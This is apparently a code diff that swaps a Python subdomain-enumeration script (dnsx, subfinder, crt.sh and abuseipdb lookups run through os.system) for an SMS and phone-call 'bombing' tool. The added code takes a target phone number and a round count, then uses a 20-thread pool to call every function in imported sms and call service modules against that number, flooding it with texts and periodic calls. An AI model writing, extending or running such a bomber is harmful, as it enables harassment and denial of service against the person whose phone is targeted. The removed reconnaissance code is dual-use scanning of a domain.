@@ -1,60 +1,46 @@
-import os
 import argparse
-from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
+from inspect import getmembers, isfunction
+from Api import sms, call
+from colorama import Fore, init
 
-parser = argparse.ArgumentParser(description="DnsBrute is a tool for Dns BruteForce")
+init(autoreset=True)  # Initialize colorama for auto-resetting colors
 
-parser.add_argument("-d", "--domain",
-                    required=True,
-                    help='domain input.')
+def get_service_functions(module):
+    """Retrieve a list of callable service functions from a module."""
+    return [func for func, _ in getmembers(module, isfunction)]
 
-parser.add_argument("-r", "--resolver",
-                    required=True,
-                    help='resolver file.')
+def execute_service(service_func, phone):
+    """Wrapper to execute a service function with error handling."""
+    try:
+        service_func(phone)
+    except Exception as e:
+        print(f"{Fore.RED}Error calling {service_func.__name__}: {e}")
 
-parser.add_argument("-w", "--wordlist",
-                    required=True,
-                    help='wordlist file.')
+def bombing(phone, count, sms_services, call_services):
+    phone = phone[1:]  # Ensure phone number is in the correct format
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        for round_number in range(count):
+            # Schedule SMS services
+            for sms_service in sms_services:
+                executor.submit(execute_service, sms_service, phone)
+            # Schedule call services every 5 rounds
+            if round_number != 0 and round_number % 5 == 0:
+                call_service = call_services[round_number // 5 % len(call_services)]
+                executor.submit(execute_service, call_service, phone)
 
-options = parser.parse_args()
+def main():
+    parser = argparse.ArgumentParser(description="This is tool for try to Echo")
+    parser.add_argument("-n", "--number", type=str, required=True, help="The phone number to target, with 09123456789 prefix.")
+    parser.add_argument("-c", "--count", type=int, required=True, help="The number of rounds for bombing.")
+    
+    args = parser.parse_args()
 
-domain = options.domain
-resolver = options.resolver
-wordlist = options.wordlist
+    sms_services = get_service_functions(sms)
+    call_services = get_service_functions(call)
 
+    bombing(phone=args.number, count=args.count, sms_services=sms_services, call_services=call_services)
+    print(f"{Fore.YELLOW}Bombing completed.")
 
-domain_parts = domain.split('.')
-
-sdomain = domain_parts[-2] if len(domain_parts) >= 2 else domain_parts[0]
-
-
-
-
-os.system("dig A +short somethingdoesntexist."+domain+" > dig-output")
-
-dig = open("dig-output","r")
-if len(dig.read()) < 1:
-
-    os.system(f"dnsx -d {domain} -w {wordlist} -r {resolver} -silent -o output")
-
-    os.system(f'curl -s "https://crt.sh/?q={domain}&output=json" | jq -r ".[].common_name" | sort -u > {sdomain}-crtsh')
-    os.system(f'subfinder -all -d {domain} -silent > {sdomain}-subfinder')
-    os.system(f'curl -s "https://www.abuseipdb.com/whois/{domain}" -H "user-agent: firefox" -b "abuseipdb_session=YOUR-session" | grep -E "<li>\w.*</li>" | sed -E "s/<\/?li>//g" | sed -e "s/$/.{domain}/" > {sdomain}-abuse')
-    os.system(f'cat {sdomain}-crtsh {sdomain}-subfinder {sdomain}-subfinder | sort -u > {sdomain}-allsub')
-
-
-    os.system(f"cat output {sdomain}-allsub | sort -u > output2")
-
-    with open("output2", "r") as file:
-        if len(file.readlines()) >= 500:
-            os.system("cat output2 | httpx > output2-")
-        else:
-            os.system("cat output2 > output2-")
-
-
-    os.system(f"cat output2- | dnsgen - > output3")
-
-    os.system(f"dnsx -d {domain} -w output3 -r {resolver} -silent -o final_output")
-
-else:
-    print("It has A record ):")
+if __name__ == "__main__":
+    main()
